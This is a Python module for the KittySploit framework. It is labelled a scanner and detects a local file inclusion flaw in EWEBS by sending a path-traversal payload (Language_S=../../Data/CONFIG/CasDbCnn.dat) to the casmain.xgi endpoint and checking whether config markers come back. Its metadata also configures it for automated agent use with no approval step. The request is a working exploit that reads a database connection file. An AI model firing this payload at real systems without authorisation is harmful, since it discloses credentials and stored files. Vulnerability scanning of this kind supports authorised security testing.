#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EWEBS is vulnerable to local file inclusion and allows remote attackers to disclose the content of locally sto."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EWEBS - Local File Inclusion Detection',
        'description': "EWEBS is vulnerable to local file inclusion and allows remote attackers to disclose the content of locally stored files via the 'Language_S' parameter supplied to the 'casmain.xgi' endpoint.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'ewebs', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9E%81%E9%80%9AEWEBS/%E6%9E%81%E9%80%9AEWEBS%20casmain.xgi%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html',
        ],
    }

    def run(self):
        path = '/casmain.xgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='Language_S=../../Data/CONFIG/CasDbCnn.dat')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('[Edition]', '[LocalInfo]',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='high',
                reason='EWEBS - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

